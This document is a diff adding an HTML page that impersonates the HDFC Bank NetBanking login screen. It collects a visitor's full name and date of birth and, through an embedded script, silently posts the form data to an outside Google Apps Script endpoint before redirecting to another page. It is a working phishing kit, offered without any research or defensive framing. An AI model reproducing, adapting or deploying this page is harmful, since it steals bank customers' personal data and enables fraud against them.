@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="xxx" >
+<head>
+<style>
+form {
+    max-width: 300px;
+    margin: 4px auto;
+    padding: 30px;
+}
+
+label {
+    display: block;
+    padding-bottom: 8px;
+    text-transform: captailize;
+    font-size: 13px;
+    color: yellow;
+	margin-top:11px
+	font-weight: bold;
+}
+
+input {
+    display: block;
+    width: 100%;
+    padding: 6px;
+    border: 1px solid;
+    font-size: 16px;
+    margin-bottom: 6px;
+}
+
+.sendBtn {
+    border: 1px solid;
+    margin:5px 0;
+    width: 200px!important;
+    color: white;
+    background-color: #1d86ff;
+    font-family: Arial,Helvetica,sans-serif;
+    
+   
+}
+</style>
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<link href="style.css" rel="stylesheet"/>
+<title>onlineindia</title>
+</head>
+<body>
+	<center><header><img src="logo.png" alt="image"></header></center>
+	<h2 class="weltext" style=" font-size: 20px; color: #333;  display: block; text-align:center;">Welcome to HDFC Bank NetBanking</h2>
+
+	
+	<h2 style="font-family:'Open Sans', sans-serif; display: block; color: #333; text-align:center; background: #F3F3F3; line-height: normal; font-size: 14px;">Login to NetBanking</h2>
+	<form action="" method="post" name="google-sheet">
+			<span style="font-family:'Open Sans', sans-serif; background: #F3F3F3; line-height: normal; font-size: 14px;">Full Name</span>
+					<br></br>
+			 <input type="E-mail" id="email" name="email" placeholder="Name" class="text" required />
+			<span style="font-family:'Open Sans', sans-serif; background: #F3F3F3; line-height: normal; font-size: 14px;">Date Of Birth</span>
+					<br></br>
+			 <input type="password" name="Password" placeholder="Date_of_birth" class="text" required />
+			 <br>
+            <input type ="submit" value="CONTINUE" class="sendBtn">
+           
+            </li>
+        </form>
+</div>
+<div style="background-color:#e2effa;padding:10px;">Dear Customer,<br> Welcome to the new login page of HDFC Bank NetBanking. <br> Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.</div>
+</div>
+<!-- partial:index.partial.html -->
+	<div class="right">
+		<img src="img1.png" width=100% alt="image">
+
+		</div>
+		</div>
+	</div>
+	
+	
+		
+<!-- partial -->
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyT1dCeObRTPWNFjNsw-wbuKaSo1Slqg-KByPaNLZE_dMiOoUHjZi-k1vF3OJ5dYztVUw/exec'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response =>  window.location.href='fourton.html')
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+</body>
+<footer><img src="footer.jpg" width=100%  alt="image"></footer>
+</html>
+
